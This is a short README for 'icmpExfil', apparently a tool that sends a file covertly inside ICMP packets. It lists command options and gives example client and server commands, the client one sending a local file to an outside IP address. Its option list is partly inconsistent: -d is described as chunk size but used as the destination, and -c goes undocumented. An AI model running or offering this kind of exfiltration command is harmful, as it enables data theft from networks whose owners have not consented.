# icmpExfil

## Options
* `-h` Help, show all options
* `-f FILE` File to exfiltrate
* `-d DEST` Chunk size to split the file into (max of 1508)
* `-s SLEEP` Time, in miliseconds, to wait between packets. Useful to make a file take longer to send.
* `-e ENCODING` Encoding to use on data file being sent. Base64 is the only one supported
* `-v VERBOSE` Print helpful information as the file is being sent. True by default.

## Example Usage

**client:** sudo ./icmp_exfil_client.py -f ./myFile -d 128.237.11.23 -c 100 -s 1000 -e base64

**server:** sudo ./icmp_exfil_server.py -e base64
